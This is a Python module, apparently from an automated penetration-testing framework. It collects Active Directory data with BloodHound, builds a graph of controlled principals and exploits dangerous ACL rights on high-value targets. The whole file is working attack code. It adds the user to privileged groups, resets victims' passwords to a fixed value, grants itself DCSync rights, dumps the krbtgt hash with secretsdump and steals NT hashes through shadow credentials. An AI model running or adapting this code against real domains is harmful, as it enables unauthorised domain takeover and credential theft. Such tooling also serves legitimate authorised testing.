"""BloodHound-based ACL pathfinding and abuse.

Collects AD data (users/groups/computers + their ACLs) with bloodhound-python,
builds a SID graph, determines which principals we control, then finds and
exploits dangerous rights (GenericAll/WriteDacl/ForceChangePassword/AddMember/
DCSync) over high-value targets.
"""
from __future__ import annotations

import json
from pathlib import Path

from core.ldap_ops import LdapContext, add_group_member, force_change_password

from .base import BaseModule

# RightName -> (action, description)
EXPLOITABLE_RIGHTS = {
    "GenericAll": "genericall",
    "GenericWrite": "genericwrite",
    "WriteDacl": "writedacl",
    "WriteOwner": "writeowner",
    "Owns": "owns",
    "ForceChangePassword": "forcechangepassword",
    "AddMember": "addmember",
    "AddSelf": "addself",
    "GetChanges": "dcsync",
    "GetChangesAll": "dcsync",
    "AddKeyCredentialLink": "shadowcredentials",
    "AddAllowedToAct": "rbcd",
}

HIGH_VALUE_GROUPS = {
    "domain admins", "enterprise admins", "administrators", "schema admins",
    "domain controllers", "account operators", "server operators",
    "backup operators", "key admins", "enterprise key admins",
}

HIGH_VALUE_USERS = {"administrator", "krbtgt"}


class PathFindModule(BaseModule):
    name = "acl_abuse"
    description = "BloodHound ACL analysis + exploitation of dangerous rights"

    def run(self, workdir: Path) -> dict:
        auth = self._pick_auth()
        if not auth:
            self.log.warn("ACL abuse requires credentials")
            return {"paths": 0}

        self.log.info("collecting AD data for ACL analysis (bloodhound)")
        self._collect(workdir, auth)
        objects = self._parse(workdir)
        if not objects:
            self.log.warn("bloodhound collection returned no data")
            return {"paths": 0}

        maps = self._build_maps(objects)
        controlled = self._controlled_sids(objects, maps, auth)
        if not controlled:
            self.log.info("no controlled principals identified in the graph")
            return {"paths": 0}

        paths = self._find_paths(objects, maps, controlled)
        self.log.ok("identified %d exploitable ACL path(s)", len(paths))
        self._execute(paths, auth)
        return {"paths": len(paths)}

    # ------------------------------------------------------------------
    def _pick_auth(self):
        creds = self.state.usable_credentials()
        if not creds:
            return None
        c = creds[0]
        return (c.domain or self.state.domain, c.username, c.password, c.nthash)

    def _dc_ip(self) -> str | None:
        for ip, h in self.state.hosts.items():
            if h.is_dc:
                return ip
        return (self.state.domain_controllers or [None])[0]

    # ------------------------------------------------------------------
    def _collect(self, workdir: Path, auth) -> None:
        domain, user, pwd, nth = auth
        dc = self._dc_ip()
        if not dc:
            return
        args = ["bloodhound-python", "-c", "All", "-d", domain,
                "-u", user, "-dc", dc, "-ns", dc, "--dns-tcp",
                "-op", "zexec_bh"]
        if nth:
            args += ["--hashes", f"aad3b435b51404eeaad3b435b51404ee:{nth}"]
        else:
            args += ["-p", pwd or ""]
        res = self.runner.run(args, timeout=900, silent=True, cwd=str(workdir))
        if res.returncode != 0:
            self.log.debug("bloodhound collection issue: %s", res.stderr[-200:])

    # ------------------------------------------------------------------
    def _parse(self, workdir: Path) -> list[dict]:
        objects: list[dict] = []
        for path in workdir.glob("zexec_bh_*.json"):
            try:
                data = json.loads(path.read_text(encoding="utf-8"))
            except (json.JSONDecodeError, OSError):
                continue
            items = data.get("data", []) if isinstance(data, dict) else []
            objects.extend(items)
        return objects

    # ------------------------------------------------------------------
    def _build_maps(self, objects: list[dict]) -> dict:
        sid_to_obj: dict[str, dict] = {}
        name_to_sid: dict[str, str] = {}
        for obj in objects:
            sid = obj.get("ObjectIdentifier")
            props = obj.get("Properties", {}) or {}
            name = props.get("name") or props.get("samaccountname")
            if sid:
                sid_to_obj[sid] = obj
                if name:
                    name_to_sid[name.lower()] = sid
            # samaccountname too
            sam = props.get("samaccountname")
            if sid and sam:
                name_to_sid[sam.lower()] = sid
        return {"sid_to_obj": sid_to_obj, "name_to_sid": name_to_sid}

    def _controlled_sids(self, objects, maps, auth) -> set[str]:
        """Compute the SIDs of principals we control (our accounts + groups)."""
        domain, user, pwd, nth = auth
        name_to_sid = maps["name_to_sid"]
        sid_to_obj = maps["sid_to_obj"]

        seeds: set[str] = set()
        # Match our usernames (and any credential we hold)
        for cred in self.state.usable_credentials():
            for key in (cred.username.lower(),
                        f"{cred.username.lower()}@{domain.lower()}" if domain else ""):
                if key in name_to_sid:
                    seeds.add(name_to_sid[key])

        # Also match the user directly
        u = user.lower().split("@")[0].split("\\")[-1]
        if u in name_to_sid:
            seeds.add(name_to_sid[u])

        if not seeds:
            return set()

        controlled = set(seeds)
        # Expand through group membership (Members of a controlled group)
        changed = True
        while changed:
            changed = False
            for sid, obj in sid_to_obj.items():
                if sid in controlled:
                    for member in obj.get("Members", []) or []:
                        mid = member.get("ObjectIdentifier")
                        if mid and mid not in controlled:
                            controlled.add(mid)
                            changed = True
                # If we control a member, we don't control the group — but if
                # we control the group, we control its members.
        return controlled

    def _find_paths(self, objects, maps, controlled: set[str]) -> list[dict]:
        """Return exploitable (controlled principal, right, target) triples."""
        sid_to_obj = maps["sid_to_obj"]
        paths = []
        for sid, obj in sid_to_obj.items():
            if sid in controlled:
                continue  # we already own it
            props = obj.get("Properties", {}) or {}
            name = (props.get("name") or "").lower()
            otype = obj.get("ObjectType", "")

            # Determine if this is a high-value target
            is_high = (
                name in HIGH_VALUE_GROUPS
                or name.rstrip("$") in HIGH_VALUE_USERS
                or (otype == "Domain")
                or (name.endswith("$") and self._is_dc(name))
            )
            if not is_high:
                continue

            for ace in obj.get("Aces", []) or []:
                principal = ace.get("PrincipalSID")
                right = ace.get("RightName")
                access = ace.get("AccessType", "Allow")
                if access != "Allow" or not principal:
                    continue
                if principal not in controlled:
                    continue
                action = EXPLOITABLE_RIGHTS.get(right)
                if not action:
                    continue
                paths.append({
                    "principal_sid": principal,
                    "right": right,
                    "action": action,
                    "target_name": props.get("name") or props.get("samaccountname"),
                    "target_sid": sid,
                    "target_type": otype,
                })
        return paths

    def _is_dc(self, name: str) -> bool:
        host = name.rstrip("$").split(".")[0].lower()
        for dc in self.state.domain_controllers:
            if dc.split(".")[0].lower() == host:
                return True
        return False

    # ------------------------------------------------------------------
    def _execute(self, paths: list[dict], auth) -> None:
        domain, user, pwd, nth = auth
        dc = self._dc_ip() or (self.state.domain_controllers or [None])[0]
        if not dc:
            return
        ctx = LdapContext(host=dc, domain=domain, username=user,
                          password=pwd, nthash=nth)

        for path in paths:
            if self.state.domain_admin_achieved:
                break
            target = path["target_name"]
            right = path["right"]
            action = path["action"]
            ttype = path["target_type"]
            self.log_finding(
                "critical", f"Dangerous ACL: {right} on {target}",
                f"Controlled principal has {right} over {target} ({ttype})",
                technique=f"ACL Abuse ({right})")

            if action == "dcsync":
                # We can already DCSync — just confirm and dump
                self._dcsync(domain, user, pwd, nth)
            elif action in ("addmember", "addself", "genericall", "genericwrite") \
                    and ttype == "Group":
                if add_group_member(ctx, target, user):
                    self.log.ok("added %s to group %s", user, target)
                    self.state.add_finding(
                        "critical", "Added to privileged group",
                        f"{user} → {target}", technique="AddMember")
                    self._dcsync(domain, user, pwd, nth)
            elif action == "forcechangepassword" and ttype == "User":
                newpass = self.config.get("general.new_password", "Zexec123!")
                if force_change_password(ctx, target, newpass):
                    self.log.ok("reset password for %s", target)
                    self.state.add_credential(
                        username=target, password=newpass, domain=domain,
                        source="forcechangepassword")
            elif action in ("writedacl", "writeowner", "owns", "genericall",
                            "genericwrite") and ttype == "Domain":
                self._grant_dcsync(domain, user, pwd, nth, dc)
            elif action == "shadowcredentials":
                self._shadow(domain, user, pwd, nth, dc, target)

    def _dcsync(self, domain, user, pwd, nth) -> None:
        dc = self._dc_ip() or (self.state.domain_controllers or [None])[0]
        if not dc:
            return
        cmd = self.runner.resolve("secretsdump", prefix="impacket-")
        if nth:
            args = [cmd, f"{domain}/{user}@{dc}", "-hashes", f"0x0:{nth}",
                    "-just-dc-user", "krbtgt"]
        else:
            args = [cmd, f"{domain}/{user}:{pwd}@{dc}", "-just-dc-user", "krbtgt"]
        res = self.runner.run(args, timeout=300, silent=True)
        if "krbtgt" in res.stdout and ":" in res.stdout:
            self.state.domain_admin_achieved = True
            self.log.ok("DCSync succeeded — DOMAIN ADMIN achieved!")

    def _grant_dcsync(self, domain, user, pwd, nth, dc) -> None:
        """Use WriteDacl over the domain to grant ourselves DCSync rights."""
        cmd = self.runner.resolve("dacledit", prefix="impacket-")
        args = [cmd, "-action", "write", "-rights", "DCSync",
                "-principal", user, "-target-dn",
                ",".join(f"DC={p}" for p in domain.split(".")),
                f"{domain}/{user}"]
        if nth:
            args += ["-hashes", f"0x0:{nth}"]
        else:
            args += ["-no-pass"]
        res = self.runner.run(args, timeout=300, silent=True)
        if res.returncode == 0:
            self.log.ok("granted DCSync to %s via WriteDacl", user)
            self._dcsync(domain, user, pwd, nth)

    def _shadow(self, domain, user, pwd, nth, dc, target) -> None:
        cmd = self.certipy_bin()
        args = [cmd, "shadow", "auto", "-u", f"{user}@{domain}",
                "-account", target, "-dc-ip", dc, "-ldap-scheme", "ldap"]
        if nth:
            args += ["-hashes", nth]
        else:
            args += ["-p", pwd or ""]
        res = self.runner.run(args, timeout=300, silent=True)
        import re
        m = re.search(r"Got hash for '[^']+':\s*(?:[0-9a-fA-F]{32}:)?([0-9a-fA-F]{32})",
                      res.stdout)
        if m:
            self.state.add_credential(username=target, nthash=m.group(1),
                                      domain=domain, source="shadow-credentials")
            self.log.ok("shadow credentials: recovered %s NT hash", target)
